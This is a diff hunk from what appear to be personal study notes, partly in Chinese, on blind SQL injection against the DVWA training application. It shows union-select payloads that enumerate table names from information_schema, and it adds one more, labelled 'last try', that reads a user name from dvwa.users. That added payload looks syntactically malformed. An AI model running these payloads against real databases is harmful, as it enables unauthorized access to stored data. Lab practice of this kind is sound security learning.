@@ -169,6 +169,8 @@ sqli bind # only got true or false result, so use 'and ' or 'or'. so transfer th
 
 	1' union select substring(table_name,1,1),null from information_schema.tables where table_schema='dvwa'# to get the table_name
 
+	1' union select substring((bin(ascii(substring(user,1,1))),null from dvwa.users limit 2,1#),1,1)  # last try
+	
 	4.猜列名
 
 就直接拿 users表为例了。
